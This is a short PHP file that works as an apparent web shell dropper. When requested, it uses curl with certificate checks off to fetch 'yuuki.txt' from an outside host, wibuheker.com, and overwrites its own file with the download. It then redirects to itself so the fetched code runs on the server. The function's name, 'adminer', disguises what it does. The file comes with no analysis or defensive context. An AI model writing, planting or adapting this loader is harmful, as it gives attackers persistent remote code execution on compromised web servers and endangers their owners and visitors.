<?php
function adminer($url, $isi) {
	$fp = fopen($isi, "w");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}
if(adminer('http://wibuheker.com/yuuki.txt', basename(__FILE__))) {
	header('Location: '.$_SERVER['REQUEST_URI']);
} else {
	echo "Unknown error<br>";
}
?>